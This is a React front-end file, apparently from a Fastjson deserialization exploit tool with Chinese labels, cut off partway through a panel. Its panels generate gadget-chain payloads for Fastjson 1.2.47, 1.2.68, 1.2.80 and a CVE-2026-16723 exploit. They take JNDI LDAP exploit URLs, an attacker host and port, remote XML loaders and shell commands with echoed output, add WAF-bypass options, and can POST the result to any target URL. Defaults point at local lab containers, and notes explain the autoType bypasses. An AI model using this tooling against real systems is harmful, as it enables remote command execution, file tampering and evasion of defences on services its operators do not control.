"use client";

import { useEffect, useState } from "react";
import { Copy, Loader2, Play, Wand2 } from "lucide-react";
import { toast } from "sonner";

import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import {
  emptyWafControlValue,
  WafControls,
  type WafControlValue,
} from "@/components/waf-controls";
import {
  ECHO_ENGINES,
  listPoc1247Gadgets,
  listPoc1268Gadgets,
  listPoc1280Gadgets,
  runPoc1247,
  runPoc1268,
  runPoc1280,
  runPoc16723,
  type EchoEngine,
  type Poc1247Gadget,
  type Poc1247Result,
  type Poc1268Gadget,
  type Poc1268Result,
  type Poc1280Gadget,
  type Poc1280Result,
  type Poc16723Result,
} from "@/lib/api";

const ECHO_1247 = new Set([
  "jdbc_rowset",
  "bcel_tomcat_dbcp",
  "bcel_tomcat_dbcp2",
  "bcel_commons_dbcp",
  "bcel_commons_dbcp2",
  "mybatis_bcel",
  "h2_jdbc",
]);
const ECHO_1268 = new Set(["postgresql_ssrf"]);
const ECHO_1280 = new Set(["postgresql", "jython", "groovy"]);

function EchoFields(props: {
  echo: string;
  setEcho: (v: string) => void;
  engine: EchoEngine;
  setEngine: (v: EchoEngine) => void;
  cmd: string;
  setCmd: (v: string) => void;
  cmdHeader: string;
  setCmdHeader: (v: string) => void;
  hint?: string;
}) {
  return (
    <div className="space-y-4 rounded-lg border border-border/60 p-3">
      <div className="grid gap-4 sm:grid-cols-2">
        <div className="grid gap-2">
          <Label>命令回显</Label>
          <Select value={props.echo} onValueChange={props.setEcho}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="false">关闭</SelectItem>
              <SelectItem value="true">开启</SelectItem>
            </SelectContent>
          </Select>
        </div>
        <div className="grid gap-2">
          <Label>回显引擎</Label>
          <Select
            value={props.engine}
            onValueChange={(v) => props.setEngine(v as EchoEngine)}
            disabled={props.echo !== "true"}
          >
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {ECHO_ENGINES.map((e) => (
                <SelectItem key={e.id} value={e.id}>
                  {e.label}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
      </div>
      {props.echo === "true" ? (
        <div className="grid gap-4 sm:grid-cols-2">
          <div className="grid gap-2">
            <Label htmlFor="echo-cmd">命令</Label>
            <Input
              id="echo-cmd"
              value={props.cmd}
              onChange={(e) => props.setCmd(e.target.value)}
            />
          </div>
          <div className="grid gap-2">
            <Label htmlFor="echo-hdr">命令请求头</Label>
            <Input
              id="echo-hdr"
              value={props.cmdHeader}
              onChange={(e) => props.setCmdHeader(e.target.value)}
            />
          </div>
        </div>
      ) : null}
      {props.hint ? (
        <p className="text-xs text-muted-foreground">{props.hint}</p>
      ) : null}
    </div>
  );
}
function CurrencyWrapControls({
  wrap,
  onWrapChange,
  field,
  onFieldChange,
}: {
  wrap: string;
  onWrapChange: (v: string) => void;
  field: string;
  onFieldChange: (v: string) => void;
}) {
  return (
    <div className="grid gap-4 sm:grid-cols-2">
      <div className="grid gap-2">
        <Label>Currency 套层（getter）</Label>
        <Select value={wrap} onValueChange={onWrapChange}>
          <SelectTrigger>
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="false">关闭（默认，$ref 已内嵌）</SelectItem>
            <SelectItem value="true">开启（业务点有期望类时）</SelectItem>
          </SelectContent>
        </Select>
        <p className="text-xs text-muted-foreground">
          MiscCodec Currency 触发 getter，与 Fastjson 版本无关。
        </p>
      </div>
      {wrap === "true" ? (
        <div className="grid gap-2">
          <Label>Currency 字段</Label>
          <Select value={field} onValueChange={onFieldChange}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="currency">currency</SelectItem>
              <SelectItem value="currencyCode">currencyCode</SelectItem>
            </SelectContent>
          </Select>
        </div>
      ) : null}
    </div>
  );
}

function Poc16723Panel() {
  const [target, setTarget] = useState("http://127.0.0.1:18083");
  const [mode, setMode] = useState<"http" | "fd">("http");
  const [host, setHost] = useState("attacker");
  const [port, setPort] = useState("9192");
  const [cmd, setCmd] = useState("id");
  const [engine, setEngine] = useState<EchoEngine>("undertow");
  const [jsonPath, setJsonPath] = useState("/json");
  const [dockerContainer, setDockerContainer] = useState(
    "cve-2026-16723-undertow",
  );
  const [echo, setEcho] = useState("true");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<Poc16723Result | null>(null);

  async function onRun() {
    setLoading(true);
    setResult(null);
    try {
      const data = await runPoc16723({
        target: target.trim(),
        mode,
        host: host.trim(),
        port: Number(port) || 9192,
        cmd: cmd.trim() || "id",
        echo: echo === "true",
        engine,
        json_path: jsonPath.trim() || "/json",
        docker_container: dockerContainer.trim(),
      });
      setResult(data);
      if (data.ok) toast.success("证明成功");
      else toast.error(data.summary || "证明失败");
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(msg);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="grid items-start gap-6 lg:grid-cols-[minmax(0,1.1fr)_minmax(0,0.9fr)]">
      <Card className="min-w-0 lg:sticky lg:top-4">
        <CardHeader>
          <CardTitle>运行参数</CardTitle>
          <CardDescription>
            对接 <code>/api/poc/cve-2026-16723</code>。靶场：
            <code>lab/cve-2026-16723</code> → 端口 18083，主机名用{" "}
            <code>attacker</code>。
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-2">
            <Label htmlFor="target-16723">目标基址</Label>
            <Input
              id="target-16723"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              placeholder="http://127.0.0.1:18083"
            />
          </div>
          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label>模式</Label>
              <Select
                value={mode}
                onValueChange={(v) => setMode(v as "http" | "fd")}
              >
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="http">http（jar:http 出网）</SelectItem>
                  <SelectItem value="fd">fd（缓存后不出网）</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="grid gap-2">
              <Label>回显</Label>
              <Select value={echo} onValueChange={setEcho}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="true">开启（推荐证明）</SelectItem>
                  <SelectItem value="false">关闭（写证明文件）</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label htmlFor="host">攻击者主机</Label>
              <Input
                id="host"
                value={host}
                onChange={(e) => setHost(e.target.value)}
              />
            </div>
            <div className="grid gap-2">
              <Label htmlFor="port">攻击者端口</Label>
              <Input
                id="port"
                value={port}
                onChange={(e) => setPort(e.target.value)}
              />
            </div>
          </div>
          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label htmlFor="cmd">命令</Label>
              <Input id="cmd" value={cmd} onChange={(e) => setCmd(e.target.value)} />
            </div>
            <div className="grid gap-2">
              <Label>回显引擎</Label>
              <Select
                value={engine}
                onValueChange={(v) => setEngine(v as EchoEngine)}
              >
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {ECHO_ENGINES.map((e) => (
                    <SelectItem key={e.id} value={e.id}>
                      {e.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>
          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label htmlFor="jsonPath">反序列化路径</Label>
              <Input
                id="jsonPath"
                value={jsonPath}
                onChange={(e) => setJsonPath(e.target.value)}
              />
            </div>
            <div className="grid gap-2">
              <Label htmlFor="docker">Docker 容器</Label>
              <Input
                id="docker"
                value={dockerContainer}
                onChange={(e) => setDockerContainer(e.target.value)}
                placeholder="空=不读证明文件"
              />
            </div>
          </div>
          <Separator />
          <Button onClick={onRun} disabled={loading} className="w-full sm:w-auto">
            {loading ? (
              <Loader2 className="size-4 animate-spin" />
            ) : (
              <Play className="size-4" />
            )}
            运行证明 PoC
          </Button>
        </CardContent>
      </Card>

      <div className="min-w-0 space-y-4">
        <Alert>
          <AlertTitle>复现注意</AlertTitle>
          <AlertDescription className="space-y-1 text-sm">
            <p>
              1. 先启动靶场：
              <code>cd lab/cve-2026-16723 &amp;&amp; docker compose up --build -d</code>
            </p>
            <p>2. 本机需 javac + ~/.m2 中的 fastjson-1.2.83.jar</p>
            <p>
              3. Docker 内访问攻击者 HTTP 用无点主机名 <code>attacker</code>
            </p>
            <p>4. 必须 fat jar；IDE 直接跑会因 ClassLoader 不同失败</p>
          </AlertDescription>
        </Alert>

        {result ? (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                结果
                <Badge variant={result.ok ? "default" : "destructive"}>
                  {result.ok ? "成功" : "失败"}
                </Badge>
              </CardTitle>
              <CardDescription>{result.summary}</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <Textarea
                readOnly
                className="min-h-64 font-mono text-xs"
                value={result.logs.join("\n")}
              />
              {result.notes.length > 0 ? (
                <ul className="list-disc space-y-1 pl-5 text-sm text-muted-foreground">
                  {result.notes.map((n) => (
                    <li key={n}>{n}</li>
                  ))}
                </ul>
              ) : null}
            </CardContent>
          </Card>
        ) : null}
      </div>
    </div>
  );
}

function Poc1247Panel() {
  const [gadgets, setGadgets] = useState<Poc1247Gadget[]>([]);
  const [gadget, setGadget] = useState("jdbc_rowset");
  const [jndiUrl, setJndiUrl] = useState("ldap://127.0.0.1:1389/Exploit");
  const [bcelCode, setBcelCode] = useState("");
  const [classB64, setClassB64] = useState("");
  const [userOverrides, setUserOverrides] = useState("");
  const [serializedB64, setSerializedB64] = useState("");
  const [h2Url, setH2Url] = useState("");
  const [getterTrigger, setGetterTrigger] = useState("ref");
  const [currencyField, setCurrencyField] = useState("currency");
  const [jsonKeyWithType, setJsonKeyWithType] = useState("true");
  const [jsonKeyAsArray, setJsonKeyAsArray] = useState("false");
  const [echo, setEcho] = useState("false");
  const [engine, setEngine] = useState<EchoEngine>("auto");
  const [cmd, setCmd] = useState("id");
  const [cmdHeader, setCmdHeader] = useState("X-Cmd");
  const [target, setTarget] = useState("http://127.0.0.1:18247/api/fastjson");
  const [send, setSend] = useState("false");
  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<Poc1247Result | null>(null);

  useEffect(() => {
    listPoc1247Gadgets()
      .then(setGadgets)
      .catch((err) => {
        const msg = err instanceof Error ? err.message : String(err);
        toast.error(msg);
      });
  }, []);

  const current = gadgets.find((g) => g.id === gadget);
  const fields = new Set(current?.input_fields ?? ["jndi_url"]);

  async function onGenerate(doSend: boolean) {
    setLoading(true);
    setResult(null);
    try {
      const data = await runPoc1247({
        gadget,
        jndi_url: jndiUrl.trim() || null,
        bcel_code: bcelCode.trim() || null,
        class_b64: classB64.trim() || null,
        user_overrides: userOverrides.trim() || null,
        serialized_b64: serializedB64.trim() || null,
        h2_url: h2Url.trim() || null,
        getter_trigger: getterTrigger,
        currency_field: currencyField,
        json_key_with_type: jsonKeyWithType === "true",
        json_key_as_array: jsonKeyAsArray === "true",
        echo: echo === "true",
        engine,
        cmd: cmd.trim() || "id",
        cmd_header: cmdHeader.trim() || "X-Cmd",
        waf_techniques: waf.techniques,
        waf_options: waf.techniques.length ? waf.options : undefined,
        target: target.trim(),
        send: doSend,
      });
      setResult(data);
      if (data.ok) {
        if (data.echo_output) toast.success("回显成功");
        else toast.success(doSend ? "已发送" : "已生成");
      } else toast.error(data.summary || "失败");
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(msg);
    } finally {
      setLoading(false);
    }
  }

  async function onCopy() {
    if (!result?.payload) return;
    try {
      await navigator.clipboard.writeText(result.payload);
      toast.success("已复制 payload");
    } catch {
      toast.error("复制失败");
    }
  }

  return (
    <div className="grid items-start gap-6 lg:grid-cols-[minmax(0,1.1fr)_minmax(0,0.9fr)]">
      <Card className="min-w-0 lg:sticky lg:top-4">
        <CardHeader>
          <CardTitle>生成参数</CardTitle>
          <CardDescription>
            对接 <code>/api/poc/1.2.47</code>。完整 gadget 靶场端口{" "}
            <code>18247</code>（<code>lab/fastjson-1247-lab</code>；勿用版本矩阵{" "}
            <code>18047</code>）。
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-2">
            <Label>Gadget</Label>
            <Select value={gadget} onValueChange={setGadget}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {gadgets.map((g) => (
                  <SelectItem key={g.id} value={g.id}>
                    {g.title}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {current ? (
              <p className="text-xs text-muted-foreground">{current.description}</p>
            ) : null}
          </div>

          {fields.has("jndi_url") ? (
            <div className="grid gap-2">
              <Label htmlFor="jndi">JNDI URL</Label>
              <Input
                id="jndi"
                value={jndiUrl}
                onChange={(e) => setJndiUrl(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("bcel_code") ? (
            <div className="grid gap-2">
              <Label htmlFor="bcel">BCEL（$$BCEL$$...，可空）</Label>
              <Textarea
                id="bcel"
                className="min-h-20 font-mono text-xs"
                value={bcelCode}
                onChange={(e) => setBcelCode(e.target.value)}
                placeholder="与 class_b64 二选一"
              />
            </div>
          ) : null}

          {fields.has("class_b64") ? (
            <div className="grid gap-2">
              <Label htmlFor="classb64">.class Base64</Label>
              <Textarea
                id="classb64"
                className="min-h-24 font-mono text-xs"
                value={classB64}
                onChange={(e) => setClassB64(e.target.value)}
                placeholder="BCEL 自动编码 / H2 INIT defineClass"
              />
            </div>
          ) : null}

          {fields.has("user_overrides") ? (
            <div className="grid gap-2">
              <Label htmlFor="overrides">userOverridesAsString</Label>
              <Textarea
                id="overrides"
                className="min-h-20 font-mono text-xs"
                value={userOverrides}
                onChange={(e) => setUserOverrides(e.target.value)}
                placeholder="HexAsciiSerializedMap:ACED...;"
              />
            </div>
          ) : null}

          {fields.has("serialized_b64") ? (
            <div className="grid gap-2">
              <Label htmlFor="serb64">二次序列化 gadget Base64</Label>
              <Textarea
                id="serb64"
                className="min-h-20 font-mono text-xs"
                value={serializedB64}
                onChange={(e) => setSerializedB64(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("h2_url") ? (
            <div className="grid gap-2">
              <Label htmlFor="h2url">H2 JDBC URL（可空，由 class_b64 生成）</Label>
              <Textarea
                id="h2url"
                className="min-h-16 font-mono text-xs"
                value={h2Url}
                onChange={(e) => setH2Url(e.target.value)}
              />
            </div>
          ) : null}

          {ECHO_1247.has(gadget) ? (
            <EchoFields
              echo={echo}
              setEcho={setEcho}
              engine={engine}
              setEngine={setEngine}
              cmd={cmd}
              setCmd={setCmd}
              cmdHeader={cmdHeader}
              setCmdHeader={setCmdHeader}
              hint="参考 java-echo-generator；JDK12+ 用 Unsafe 反射。开启后自动编译回显类填入 BCEL/H2（需本机 javac）。"
            />
          ) : null}

          <div className="grid gap-2">
            <Label>Getter 触发</Label>
            <Select value={getterTrigger} onValueChange={setGetterTrigger}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="ref">$ref（无期望类，默认）</SelectItem>
                <SelectItem value="json_key">JSONObject 作 Map key</SelectItem>
                <SelectItem value="currency">Currency 套层（有期望类）</SelectItem>
                <SelectItem value="currency_json_key">
                  Currency + json_key（java-chains）
                </SelectItem>
              </SelectContent>
            </Select>
            <p className="text-xs text-muted-foreground">
              有期望类时选 currency / currency_json_key；json_key 可省 @type 或改
              JSONArray。
            </p>
          </div>

          {getterTrigger === "currency" ||
          getterTrigger === "currency_json_key" ? (
            <div className="grid gap-2">
              <Label>Currency 字段</Label>
              <Select value={currencyField} onValueChange={setCurrencyField}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="currency">currency</SelectItem>
                  <SelectItem value="currencyCode">currencyCode</SelectItem>
                </SelectContent>
              </Select>
            </div>
          ) : null}

          {getterTrigger === "json_key" ||
          getterTrigger === "currency_json_key" ? (
            <div className="grid gap-4 sm:grid-cols-2">
              <div className="grid gap-2">
                <Label>json_key 带 @type</Label>
                <Select
                  value={jsonKeyWithType}
                  onValueChange={setJsonKeyWithType}
                >
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="true">带 JSONObject @type</SelectItem>
                    <SelectItem value="false">省略（默认 JSONObject）</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="grid gap-2">
                <Label>json_key 形态</Label>
                <Select
                  value={jsonKeyAsArray}
                  onValueChange={setJsonKeyAsArray}
                >
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="false">对象作 key</SelectItem>
                    <SelectItem value="true">JSONArray 作 key</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          ) : null}

          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label htmlFor="target-1247">目标 URL（可选发送）</Label>
              <Input
                id="target-1247"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
              />
            </div>
            <div className="grid gap-2">
              <Label>生成后发送</Label>
              <Select value={send} onValueChange={setSend}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="false">仅生成</SelectItem>
                  <SelectItem value="true">POST 到目标</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <WafControls value={waf} onChange={setWaf} />

          <Separator />
          <div className="flex flex-wrap gap-2">
            <Button
              onClick={() => onGenerate(send === "true")}
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="size-4 animate-spin" />
              ) : send === "true" ? (
                <Play className="size-4" />
              ) : (
                <Wand2 className="size-4" />
              )}
              {send === "true" ? "生成并发送" : "生成 payload"}
            </Button>
            <Button
              variant="outline"
              onClick={onCopy}
              disabled={!result?.payload}
            >
              <Copy className="size-4" />
              复制
            </Button>
          </div>
        </CardContent>
      </Card>

      <div className="min-w-0 space-y-4">
        <Alert>
          <AlertTitle>1.2.47 缓存绕过</AlertTitle>
          <AlertDescription className="space-y-1 text-sm">
            <p>
              <code>java.lang.Class</code> → MiscCodec →{" "}
              <code>TypeUtils.loadClass</code> 写入 mappings，checkAutoType
              优先命中缓存。
            </p>
            <p>
              1.2.48 起默认不缓存。BCEL 需 jdk≤8u251 + dbcp/mybatis；JdbcRowSet
              需 JNDI 出网。
            </p>
            <p>
              Getter：无期望类用 <code>$ref</code> / JSONObject 作 key；有期望类套{" "}
              <code>java.util.Currency</code>。
            </p>
            {current ? (
              <p>
                依赖：{current.requires.join(" / ")}；JDK：{current.jdk}
              </p>
            ) : null}
          </AlertDescription>
        </Alert>

        {result ? (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                {result.title || result.gadget}
                <Badge variant={result.ok ? "default" : "destructive"}>
                  {result.sent ? `HTTP ${result.status_code ?? "?"}` : "已生成"}
                </Badge>
              </CardTitle>
              <CardDescription>{result.summary}</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              {result.waf_techniques && result.waf_techniques.length > 0 ? (
                <div className="flex flex-wrap gap-1">
                  {result.waf_techniques.map((t) => (
                    <Badge key={t} variant="secondary">
                      waf:{t}
                    </Badge>
                  ))}
                </div>
              ) : null}
              <Textarea
                readOnly
                className="min-h-72 font-mono text-xs"
                value={result.payload}
              />
              {result.response_preview ? (
                <Textarea
                  readOnly
                  className="min-h-28 font-mono text-xs"
                  value={result.response_preview}
                />
              ) : null}
              {result.echo_output ? (
                <div className="grid gap-2">
                  <Label>回显输出</Label>
                  <Textarea
                    readOnly
                    className="min-h-28 font-mono text-xs"
                    value={result.echo_output}
                  />
                </div>
              ) : null}
              {result.notes.length > 0 ? (
                <ul className="list-disc space-y-1 pl-5 text-sm text-muted-foreground">
                  {result.notes.slice(0, 4).map((n) => (
                    <li key={n}>{n}</li>
                  ))}
                </ul>
              ) : null}
            </CardContent>
          </Card>
        ) : null}
      </div>
    </div>
  );
}

function Poc1268Panel() {
  const [gadgets, setGadgets] = useState<Poc1268Gadget[]>([]);
  const [gadget, setGadget] = useState("file_truncate");
  const [file, setFile] = useState("/tmp/fj1268_demo");
  const [content, setContent] = useState("FJ1268_DEMO");
  const [source, setSource] = useState("/tmp/fj1268_copy_src");
  const [url, setUrl] = useState("file:///tmp/fj1268_copy_src");
  const [guessByte, setGuessByte] = useState("70");
  const [host, setHost] = useState("127.0.0.1");
  const [port, setPort] = useState("3308");
  const [jdbcUrl, setJdbcUrl] = useState("");
  const [socketFactoryArg, setSocketFactoryArg] = useState(
    "http://host.docker.internal:18099/bean.xml",
  );
  const [wrapCurrency, setWrapCurrency] = useState("false");
  const [currencyField, setCurrencyField] = useState("currency");
  const [echo, setEcho] = useState("false");
  const [engine, setEngine] = useState<EchoEngine>("auto");
  const [cmd, setCmd] = useState("id");
  const [cmdHeader, setCmdHeader] = useState("X-Cmd");
  const [target, setTarget] = useState("http://127.0.0.1:18268/api/fastjson");
  const [send, setSend] = useState("false");
  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<Poc1268Result | null>(null);

  useEffect(() => {
    listPoc1268Gadgets()
      .then(setGadgets)
      .catch((err) => {
        const msg = err instanceof Error ? err.message : String(err);
        toast.error(msg);
      });
  }, []);

  const current = gadgets.find((g) => g.id === gadget);
  const fields = new Set(current?.input_fields ?? ["file"]);

  async function onGenerate(doSend: boolean) {
    setLoading(true);
    setResult(null);
    try {
      const data = await runPoc1268({
        gadget,
        file: file.trim() || null,
        content: content.trim() || null,
        source: source.trim() || null,
        url: url.trim() || null,
        guess_byte: guessByte ? Number(guessByte) : null,
        host: host.trim() || null,
        port: port ? Number(port) : null,
        jdbc_url: jdbcUrl.trim() || null,
        socket_factory_arg: socketFactoryArg.trim() || null,
        wrap_currency: wrapCurrency === "true",
        currency_field: currencyField,
        echo: echo === "true",
        engine,
        cmd: cmd.trim() || "id",
        cmd_header: cmdHeader.trim() || "X-Cmd",
        waf_techniques: waf.techniques,
        waf_options: waf.techniques.length ? waf.options : undefined,
        target: target.trim(),
        send: doSend,
      });
      setResult(data);
      if (data.ok) {
        if (data.echo_output) toast.success("回显成功");
        else toast.success(doSend ? "已发送" : "已生成");
      } else toast.error(data.summary || "失败");
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(msg);
    } finally {
      setLoading(false);
    }
  }

  async function onCopy() {
    if (!result?.payload) return;
    try {
      await navigator.clipboard.writeText(result.payload);
      toast.success("已复制 payload");
    } catch {
      toast.error("复制失败");
    }
  }

  return (
    <div className="grid items-start gap-6 lg:grid-cols-[minmax(0,1.1fr)_minmax(0,0.9fr)]">
      <Card className="min-w-0 lg:sticky lg:top-4">
        <CardHeader>
          <CardTitle>生成参数</CardTitle>
          <CardDescription>
            对接 <code>/api/poc/1.2.68</code>。依赖靶场{" "}
            <code>lab/fastjson-1268-lab</code> → 端口 <code>18268</code>。
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-2">
            <Label>Gadget</Label>
            <Select value={gadget} onValueChange={setGadget}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {gadgets.map((g) => (
                  <SelectItem key={g.id} value={g.id}>
                    {g.title}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {current ? (
              <p className="text-xs text-muted-foreground">{current.description}</p>
            ) : null}
          </div>

          {fields.has("file") ? (
            <div className="grid gap-2">
              <Label htmlFor="file-1268">目标文件</Label>
              <Input
                id="file-1268"
                value={file}
                onChange={(e) => setFile(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("content") ? (
            <div className="grid gap-2">
              <Label htmlFor="content-1268">写入内容</Label>
              <Textarea
                id="content-1268"
                className="min-h-20 font-mono text-xs"
                value={content}
                onChange={(e) => setContent(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("source") ? (
            <div className="grid gap-2">
              <Label htmlFor="source-1268">复制源路径</Label>
              <Input
                id="source-1268"
                value={source}
                onChange={(e) => setSource(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("url") ? (
            <div className="grid gap-2">
              <Label htmlFor="url-1268">读文件 URL</Label>
              <Input
                id="url-1268"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("guess_byte") ? (
            <div className="grid gap-2">
              <Label htmlFor="guess-1268">猜测首字节 (0-255)</Label>
              <Input
                id="guess-1268"
                value={guessByte}
                onChange={(e) => setGuessByte(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("host") || fields.has("port") ? (
            <div className="grid gap-4 sm:grid-cols-2">
              <div className="grid gap-2">
                <Label>Host</Label>
                <Input value={host} onChange={(e) => setHost(e.target.value)} />
              </div>
              <div className="grid gap-2">
                <Label>Port</Label>
                <Input value={port} onChange={(e) => setPort(e.target.value)} />
              </div>
            </div>
          ) : null}

          {fields.has("jdbc_url") ? (
            <div className="grid gap-2">
              <Label>JDBC URL</Label>
              <Textarea
                className="min-h-16 font-mono text-xs"
                value={jdbcUrl}
                onChange={(e) => setJdbcUrl(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("socket_factory_arg") ? (
            <div className="grid gap-2">
              <Label>socketFactoryArg (XML URL)</Label>
              <Input
                value={socketFactoryArg}
                onChange={(e) => setSocketFactoryArg(e.target.value)}
              />
            </div>
          ) : null}

          {ECHO_1268.has(gadget) ? (
            <EchoFields
              echo={echo}
              setEcho={setEcho}
              engine={engine}
              setEngine={setEngine}
              cmd={cmd}
              setCmd={setCmd}
              cmdHeader={cmdHeader}
              setCmdHeader={setCmdHeader}
              hint="postgresql_ssrf：生成 bean-echo.xml + echo.jar，需 HTTP 托管后由目标拉取。"
            />
          ) : null}

          <CurrencyWrapControls
            wrap={wrapCurrency}
            onWrapChange={setWrapCurrency}
            field={currencyField}
            onFieldChange={setCurrencyField}
          />

          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label htmlFor="target-1268">目标 URL（可选发送）</Label>
              <Input
                id="target-1268"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
              />
            </div>
            <div className="grid gap-2">
              <Label>生成后发送</Label>
              <Select value={send} onValueChange={setSend}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="false">仅生成</SelectItem>
                  <SelectItem value="true">POST 到目标</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <WafControls value={waf} onChange={setWaf} />

          <Separator />
          <div className="flex flex-wrap gap-2">
            <Button
              onClick={() => onGenerate(send === "true")}
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="size-4 animate-spin" />
              ) : send === "true" ? (
                <Play className="size-4" />
              ) : (
                <Wand2 className="size-4" />
              )}
              {send === "true" ? "生成并发送" : "生成 payload"}
            </Button>
            <Button
              variant="outline"
              onClick={onCopy}
              disabled={!result?.payload}
            >
              <Copy className="size-4" />
              复制
            </Button>
          </div>
        </CardContent>
      </Card>

      <div className="min-w-0 space-y-4">
        <Alert>
          <AlertTitle>1.2.68 AutoCloseable</AlertTitle>
          <AlertDescription className="space-y-1 text-sm">
            <p>
              双 <code>@type</code>：首个{" "}
              <code>java.lang.AutoCloseable</code> 作 expectClass，绕过
              checkAutoType（1.2.69 起进黑名单）。
            </p>
            <p>
              验证：<code>python tests/lab/lab_test_1268_gadgets.py</code>
            </p>
            {current ? (
              <p>
                依赖：{current.requires.join(" / ")}；JDK：{current.jdk}
              </p>
            ) : null}
          </AlertDescription>
        </Alert>

        {result ? (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                {result.title || result.gadget}
                <Badge variant={result.ok ? "default" : "destructive"}>
                  {result.sent ? `HTTP ${result.status_code ?? "?"}` : "已生成"}
                </Badge>
              </CardTitle>
              <CardDescription>{result.summary}</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              {result.waf_techniques && result.waf_techniques.length > 0 ? (
                <div className="flex flex-wrap gap-1">
                  {result.waf_techniques.map((t) => (
                    <Badge key={t} variant="secondary">
                      waf:{t}
                    </Badge>
                  ))}
                </div>
              ) : null}
              <Textarea
                readOnly
                className="min-h-72 font-mono text-xs"
                value={result.payload}
              />
              {result.response_preview ? (
                <Textarea
                  readOnly
                  className="min-h-28 font-mono text-xs"
                  value={result.response_preview}
                />
              ) : null}
              {result.echo_output ? (
                <div className="grid gap-2">
                  <Label>回显输出</Label>
                  <Textarea
                    readOnly
                    className="min-h-28 font-mono text-xs"
                    value={result.echo_output}
                  />
                </div>
              ) : null}
            </CardContent>
          </Card>
        ) : null}
      </div>
    </div>
  );
}

function Poc1280Panel() {
  const [gadgets, setGadgets] = useState<Poc1280Gadget[]>([]);
  const [gadget, setGadget] = useState("io_write");
  const [file, setFile] = useState("/tmp/fj1280_io_write");
  const [content, setContent] = useState("FJ1280_IO_WRITE");
  const [url, setUrl] = useState("file:///tmp/fj1280_read_src");
  const [host, setHost] = useState("127.0.0.1");
  const [port, setPort] = useState("2333");
